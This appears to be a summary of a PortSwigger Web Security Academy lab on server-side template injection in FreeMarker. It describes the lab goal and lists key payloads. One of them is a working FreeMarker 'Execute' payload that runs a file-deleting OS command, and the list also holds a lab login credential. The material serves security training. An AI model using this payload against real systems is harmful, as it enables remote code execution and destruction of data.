## Server-side template injection using documentation

**Category:** ssti
**Difficulty:** Unknown

### Description
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete themorale.txtfile from Carlos's home directory.

### Solution Steps
You should try solving this lab using only the documentation. However, if you get really stuck, you can try finding a well-known exploit by @albinowax that you can use to solve the lab.

### Key Payloads
- `morale.txt`
- `content-manager:C0nt3ntM4n4g3r`
- `${someExpression}`
- `${foobar}`
- `new()`
- `TemplateModel`
- `Execute`
- `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`

### Indicators of Success
- Template expression evaluated (7*7=49)
- Server-side code execution confirmed
- OS command output visible
- Template engine identified
- File read/write or RCE achieved
---
*Source: PortSwigger Web Security Academy*
